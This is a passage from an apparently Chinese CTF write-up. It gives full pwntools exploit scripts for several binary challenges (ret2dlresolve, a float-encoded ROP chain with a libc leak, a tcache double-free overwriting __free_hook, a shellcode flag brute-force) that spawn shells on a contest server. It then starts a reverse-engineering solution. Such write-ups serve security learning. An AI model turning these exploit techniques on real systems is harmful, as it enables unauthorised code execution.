'\x00' * <span class="number">120</span> +<span class="string">"aaaa"</span> + <span class="string">"\x00"</span></span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sh.interactive()</span><br><span class="line"><span class="keyword">if</span> <span class="attr">__name__</span> == <span class="string">"__main__"</span>:</span><br><span class="line">    pwn(<span class="string">"47.110.227.208"</span>,<span class="number">10001</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712114354-45684e40-a457-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712114354-45684e40-a457-1.png" alt="img"></a></p><h3 id="stackpwn"><a href="#stackpwn" class="headerlink" title="stackpwn"></a>stackpwn</h3><p>导入IDA后，发现没有puts、write等，只有read且有溢出，那么这道题就是典型的考察ret2dlresolve，用ctf-wiki的脚本改一下就可以拿到shell了<br>利用roputils简化攻击</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from roputils import *</span><br><span class="line">from pwn import process</span><br><span class="line">from pwn import gdb</span><br><span class="line">from pwn import context</span><br><span class="line">from pwn import remote   <span class="comment">#r = process('./pwn3')</span></span><br><span class="line">r = remote(<span class="string">"47.110.227.208"</span>,10003)</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">rop = ROP('./pwn3')</span><br><span class="line">offset = 60</span><br><span class="line">bss_base = 0x804a000 + 0x800</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line">buf += rop.call('read', 0, bss_base, 100)</span><br><span class="line">buf += rop.dl_resolve_call(bss_base + 20, bss_base)</span><br><span class="line">r.send(buf)</span><br><span class="line">buf = rop.string('/bin/sh')</span><br><span class="line">buf += rop.fill(20, buf)</span><br><span class="line">buf += rop.dl_resolve_data(bss_base + 20, 'system')</span><br><span class="line">buf += rop.fill(100, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712114455-69fd66c8-a457-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712114455-69fd66c8-a457-1.png" alt="img"></a></p><h3 id="floatpwn"><a href="#floatpwn" class="headerlink" title="floatpwn"></a>floatpwn</h3><p>这题考察了确定浮点寄存器通过movss写入内存时的数值<br>方法：只能人工二分法一次一次去尝试，然后发现小数点后45位之前可以忽略不计，真正开始有意义的数值在小数点后45位开始。然后求出对应的n使得写回内存时是我想要的数值，从而构造ROP链。但是想构造ROP链之前需要实现无限写，所以输入size时，可以考虑输入负数，实现无符号整数溢出，从而无限写。因为控制写入数据位置的i变量位于栈空间底部，所以要使得写到i里的数据为10到12即可，因为可以考虑直接略过ebp，直接修改rip。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">from</span> pwn import *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">elf = ELF(<span class="string">"pwn2"</span>)</span><br><span class="line">sh = <span class="number">0</span></span><br><span class="line">lib = <span class="number">0</span></span><br><span class="line">def inputFloat(<span class="built_in">num</span>):</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.<span class="built_in">send</span>(<span class="built_in">num</span>)</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline()</span><br><span class="line">def inputRop(<span class="built_in">num</span>):</span><br><span class="line">    <span class="built_in">num</span> = str(<span class="built_in">num</span>)</span><br><span class="line">    <span class="built_in">num</span> = <span class="built_in">num</span>.rjust(<span class="number">45</span>,<span class="string">"0"</span>)</span><br><span class="line">    <span class="built_in">num</span> = <span class="built_in">num</span>.ljust(<span class="number">0x62</span>,<span class="string">"0"</span>)</span><br><span class="line">    inputFloat(<span class="string">"0."</span> + <span class="built_in">num</span>)</span><br><span class="line">    inputFloat(<span class="string">"0"</span>) </span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    <span class="built_in">global</span> sh</span><br><span class="line">    <span class="built_in">global</span> lib</span><br><span class="line">    <span class="keyword">if</span>(debug == <span class="number">1</span>):</span><br><span class="line">        sh = <span class="built_in">process</span>(<span class="string">"./pwn2"</span>)</span><br><span class="line">        lib = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sh = remote(ip,port)</span><br><span class="line">        lib = ELF(<span class="string">"libc6_2.27-3ubuntu1_amd64.so"</span>)</span><br><span class="line">    <span class="comment">#puts 5879714 0x400640</span></span><br><span class="line">    <span class="comment">#pop_rdi 5881041 0x4009f3</span></span><br><span class="line">    <span class="comment">#__libc_start_main_got 8822026 0x601038</span></span><br><span class="line">    <span class="comment">#main 5880847 0x400969</span></span><br><span class="line">    <span class="comment">#start 5879938 0x4006E0</span></span><br><span class="line">    <span class="comment">#call vul 5880867 0x400977</span></span><br><span class="line">    <span class="comment">#vul 5880653 0x4008DE</span></span><br><span class="line">    <span class="comment">#read 5879781 0x400670</span></span><br><span class="line">    <span class="comment">#pop_rsi_r15_ret 5881038 0x4009f1</span></span><br><span class="line">    <span class="comment">#read_got 8822014 0x601030</span></span><br><span class="line">    <span class="comment">#binsh 8822106 0x601071</span></span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline(<span class="string">"-1.9999"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">13</span>):</span><br><span class="line">        inputFloat(<span class="string">"111"</span>)</span><br><span class="line">    inputFloat(<span class="string">"13"</span>)</span><br><span class="line">    inputFloat(<span class="string">"13"</span>)</span><br><span class="line">    inputFloat(<span class="string">"0."</span> + <span class="string">"0"</span> * <span class="number">43</span> + <span class="string">"23"</span>)<span class="comment">#0x11</span></span><br><span class="line">    inputFloat(<span class="string">"0."</span> + <span class="string">"0"</span> * <span class="number">43</span> + <span class="string">"23"</span>)<span class="comment">#fake</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#rip = 0x4009f3</span></span><br><span class="line">    <span class="comment">#pop_rdi_ret</span></span><br><span class="line">    inputRop(<span class="number">5881041</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#__libc_start_main got</span></span><br><span class="line">    inputRop(<span class="number">8822026</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#puts_plt</span></span><br><span class="line">    inputRop(<span class="number">5879714</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#pop_rdi_ret</span></span><br><span class="line">    inputRop(<span class="number">5881041</span>)</span><br><span class="line">    inputRop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#pop_rsi_r15_ret</span></span><br><span class="line">    inputRop(<span class="number">5881038</span>)</span><br><span class="line">    inputRop(<span class="number">8822106</span>)</span><br><span class="line">    inputRop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#read_plt</span></span><br><span class="line">    inputRop(<span class="number">5879781</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#pop_rdi_ret</span></span><br><span class="line">    inputRop(<span class="number">5881041</span>)</span><br><span class="line">    inputRop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#pop_rsi_r15_ret</span></span><br><span class="line">    inputRop(<span class="number">5881038</span>)</span><br><span class="line">    inputRop(<span class="number">8822014</span>)</span><br><span class="line">    inputRop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#read_plt</span></span><br><span class="line">    inputRop(<span class="number">5879781</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#pop_rdi_ret</span></span><br><span class="line">    inputRop(<span class="number">5881041</span>)</span><br><span class="line">    inputRop(<span class="number">8822106</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#read_plt</span></span><br><span class="line">    inputRop(<span class="number">5879781</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#input()</span></span><br><span class="line">    sh.recvuntil(<span class="string">"plz input your float:"</span>)</span><br><span class="line">    sh.sendline(<span class="string">"0"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"do you want to continue?(y/n)"</span>)</span><br><span class="line">    sh.<span class="built_in">send</span>(<span class="string">"n"</span>)</span><br><span class="line"></span><br><span class="line">    __libc_start_main = u64(sh.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">    libc = __libc_start_main - lib.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    <span class="keyword">system</span> = libc + lib.symbols[<span class="string">'system'</span>]</span><br><span class="line">    binsh = libc + lib.search(<span class="string">"/bin/sh\x00"</span>).next()</span><br><span class="line">    sh.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sh.sendline(p64(<span class="keyword">system</span>))</span><br><span class="line">    <span class="built_in">log</span>.success(<span class="string">"__libc_start_main: "</span> + hex(__libc_start_main))</span><br><span class="line">    <span class="built_in">log</span>.success(<span class="string">"system: "</span> + hex(<span class="keyword">system</span>))</span><br><span class="line">    <span class="built_in">log</span>.success(<span class="string">"binsh: "</span> + hex(binsh))</span><br><span class="line">    <span class="built_in">log</span>.success(<span class="string">"libc: "</span> + hex(libc))</span><br><span class="line">    sh.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    pwn(<span class="string">"47.110.227.208"</span>,<span class="number">10002</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712114506-706c344e-a457-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712114506-706c344e-a457-1.png" alt="img"></a></p><h3 id="Babytcache"><a href="#Babytcache" class="headerlink" title="Babytcache"></a>Babytcache</h3><p>checksec 可以看到程序没有开PIE,同时bss中存放了_IO_2_1_stdout_的地址,并且libc2.27有double free,所以思路就很明确了.有了double free就可以malloc 2 everywhere,所以这样一的难点在于如何leak libc,通过double free,可以让fd指向_IO_2_1<em>stdout</em>,从而malloc 2 _IO_2_1<em>stdout</em>,从而修改write_base来leak libc,之后再double free去修改free_hook为system,去free一个/bin/sh就可以了</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">libc=ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"><span class="keyword">sh</span>=remote(<span class="string">"47.110.227.208"</span>,<span class="number">10006</span>)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">add</span>(size,content):</span><br><span class="line">    <span class="keyword">sh</span>.sendline(<span class="string">'1'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'input your size:'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(size))</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'input your message:'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.send(content)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">def add2(size,content):</span><br><span class="line">    <span class="keyword">sh</span>.sendline(<span class="string">'1'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'input your size:'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(size))</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'input your message:'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.send(content)</span><br><span class="line">    #sh.recvuntil(<span class="string">'Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">def <span class="keyword">delete</span>(<span class="built_in">index</span>):</span><br><span class="line">    <span class="keyword">sh</span>.sendline(<span class="string">'2'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'input the index: '</span>)</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(<span class="built_in">index</span>))</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x100,<span class="string">'a\n'</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x100,<span class="string">'a\n'</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x100,<span class="string">'a\n'</span>)</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x100,p64(<span class="number">0</span>x0000000000602020)+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x100,p64(<span class="number">0</span>x0000000000602020)+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x100,<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    add2(<span class="number">0</span>x100,p64(<span class="number">0</span>xfbad1880)+p64(<span class="number">0</span>x0)*<span class="number">3</span>+<span class="string">'\x20\n'</span>)</span><br><span class="line">    libc_base=u64(<span class="keyword">sh</span>.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)-<span class="number">0</span>x3eb780</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"libc_base -&gt; "</span> + hex(libc_base)</span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    <span class="built_in">system</span>=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x10,<span class="string">'/bin/sh\x00\n'</span>) # <span class="built_in">index</span> <span class="number">7</span></span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x20,<span class="string">'\n'</span>) # <span class="built_in">index</span> <span class="number">8</span></span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">8</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x20,p64(free_hook)+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x20,p64(free_hook)+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x20,p64(<span class="built_in">system</span>)+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712115336-a027c15c-a458-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712115336-a027c15c-a458-1.png" alt="img"></a></p><h3 id="codepwn"><a href="#codepwn" class="headerlink" title="codepwn"></a>codepwn</h3><p>通过逆向可以发现程序将flag存入了内存中,并且我们可以选择flag对应的下标进行对比,可是4字节的shellcode有着限制,并且v5是call shellcode之后的返回值,那么就必须在shellcode中对rax进行赋值操作,可以观察到r9寄存器的大小是跟printf出来的字节数相关,那么就可以通过push r9,pop rax,ret,三个操作来对rax赋值,进而根据程序最后的判断来确认我们猜测的flag对应下标的那个字母是否正确,接下来就是爆破就完事了</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'CRITICAL'</span> </span><br><span class="line"></span><br><span class="line">def flag_index(<span class="built_in">index</span>): </span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(<span class="built_in">index</span>)) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def code(code): </span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.send(code) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def name(size,content): </span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'tell me your name size:\n'</span>) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(size)) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'input your name:\n'</span>) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.sendline(content) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag=<span class="keyword">open</span>(<span class="string">'./pwn4_flag'</span>,<span class="string">'a+'</span>) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">index</span> in <span class="built_in">range</span>(<span class="number">32</span>): </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">0</span>x1,<span class="number">0</span>x7f): </span><br><span class="line"></span><br><span class="line">            <span class="keyword">sh</span>=remote(<span class="string">'47.110.227.208'</span>,<span class="number">10004</span>) </span><br><span class="line"></span><br><span class="line">            #sh=process(<span class="string">'./pwn4'</span>) </span><br><span class="line"></span><br><span class="line">            <span class="keyword">sh</span>.recvuntil(<span class="string">'this is my gift for you, take it!\n'</span>) </span><br><span class="line"></span><br><span class="line">            flag_index(<span class="built_in">index</span>) </span><br><span class="line"></span><br><span class="line">            <span class="keyword">sh</span>.recvuntil(<span class="string">'input your code:\n'</span>) </span><br><span class="line"></span><br><span class="line">            code(<span class="string">'AQX\xC3'</span>) </span><br><span class="line"></span><br><span class="line">            padding=<span class="string">'a'</span>.ljust(i,<span class="string">'a'</span>) </span><br><span class="line"></span><br><span class="line">            name(<span class="number">0</span>x100,padding) </span><br><span class="line"></span><br><span class="line">            <span class="keyword">sh</span>.recvuntil(<span class="string">'Hello are you ready? '</span>+padding+<span class="string">'\n'</span>) </span><br><span class="line"></span><br><span class="line">            <span class="keyword">sh</span>.sendline() </span><br><span class="line"></span><br><span class="line">            info = <span class="keyword">sh</span>.recv() </span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>((info).<span class="keyword">find</span>(<span class="string">'bye!'</span>) != -<span class="number">1</span>): </span><br><span class="line"></span><br><span class="line">                <span class="keyword">print</span>  chr(i+<span class="number">0</span>x16) </span><br><span class="line"></span><br><span class="line">                flag.<span class="keyword">write</span>(chr(i+<span class="number">0</span>x16)) </span><br><span class="line"></span><br><span class="line">                <span class="keyword">sh</span>.<span class="keyword">close</span>() </span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span> </span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>: </span><br><span class="line"></span><br><span class="line">                <span class="keyword">sh</span>.<span class="keyword">close</span>() </span><br><span class="line"></span><br><span class="line">except KeyboardInterrup<span class="variable">t:</span> </span><br><span class="line"></span><br><span class="line">    flag.<span class="keyword">close</span>() </span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">excep<span class="variable">t:</span> </span><br><span class="line"></span><br><span class="line">    flag.<span class="keyword">close</span>() </span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.<span class="keyword">close</span>()</span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712115357-acb3b9d0-a458-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712115357-acb3b9d0-a458-1.png" alt="img"></a></p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="Secret"><a href="#Secret" class="headerlink" title="Secret"></a>Secret</h3><p>（emmm这一题偷懒了），<br>首先分析主函数<br>里面有两个check函数。进入checktime（）函数，关键代码是这里，</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*(&amp;v5 + i) = rand();</span><br><span class="line">  if ( <span class="number">14766</span> * v11 + <span class="number">18242</span> * v10 + <span class="number">4657</span> * v9 + <span class="number">22453</span> * v8 + <span class="number">7236</span> * v7 + <span class="number">28554</span> * v6 + <span class="number">25606</span> * v5 + <span class="number">12289</span> * v12 == <span class="number">12977737</span></span><br><span class="line">    &amp;&amp; <span class="number">27429</span> * v11 + <span class="number">8015</span> * v10 + <span class="number">16511</span> * v9 + <span class="number">17180</span> * v8 + <span class="number">27141</span> * v7 + <span class="number">31813</span> * v6 + <span class="number">7412</span> * v5 + <span class="number">18249</span> * v12 == <span class="number">15081473</span></span><br><span class="line">    &amp;&amp; <span class="number">2846</span> * v11 + <span class="number">28353</span> * v10 + <span class="number">19864</span> * v9 + <span class="number">27377</span> * v8 + <span class="number">9006</span> * v7 + <span class="number">13657</span> * v6 + <span class="number">19099</span> * v5 + <span class="number">25835</span> * v12 == <span class="number">13554960</span></span><br><span class="line">    &amp;&amp; <span class="number">1078</span> * v11 + <span class="number">5007</span> * v10 + <span class="number">6568</span> * v9 + <span class="number">23034</span> * v8 + <span class="number">10150</span> * v7 + <span class="number">22949</span> * v6 + <span class="number">32646</span> * v5 + <span class="number">15255</span> * v12 == <span class="number">11284005</span></span><br><span class="line">    &amp;&amp; <span class="number">8010</span> * v11 + <span class="number">15430</span> * v10 + <span class="number">6657</span> * v9 + <span class="number">1009</span> * v8 + <span class="number">25691</span> * v7 + <span class="number">15960</span> * v6 + <span class="number">19493</span> * v5 + <span class="number">29491</span> * v12 == <span class="number">10759932</span></span><br><span class="line">    &amp;&amp; <span class="number">4605</span> * v11 + <span class="number">14468</span> * v10 + <span class="number">5017</span> * v9 + <span class="number">12805</span> * v8 + <span class="number">22973</span> * v7 + <span class="number">30584</span> * v6 + <span class="number">12620</span> * v5 + <span class="number">32085</span> * v12 == <span class="number">12085266</span></span><br><span class="line">    &amp;&amp; <span class="number">7478</span> * v11 + <span class="number">6524</span> * v10 + <span class="number">25994</span> * v9 + <span class="number">16215</span> * v8 + <span class="number">12864</span> * v7 + <span class="number">20574</span> * v6 + <span class="number">8882</span> * v5 + <span class="number">14794</span> * v12 == <span class="number">11323393</span></span><br><span class="line">    &amp;&amp; <span class="number">15263</span> * v11 + <span class="number">8821</span> * v10 + <span class="number">25489</span> * v9 + <span class="number">9598</span> * v8 + <span class="number">26847</span> * v7 + <span class="number">5175</span> * v6 + <span class="number">6515</span> * v5 + <span class="number">27411</span> * v12 == <span class="number">11677607</span> )</span><br><span class="line">  &#123;</span><br></pre></td></tr></table></figure><p>一共8位字符，猜测前5位为flag{然后解个方程（也可以直接遍历后三个字符的所有可能，找到符合判断条件的）<br>得到 flag{Th3<br>然后来到关键的check函数，看到这里，</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( j = 0; !v12[j]; ++j )</span><br><span class="line">      ;</span><br><span class="line">   <span class="built_in"> if </span>( j &gt;= v11 )</span><br><span class="line">      break;</span><br><span class="line">    v9 = 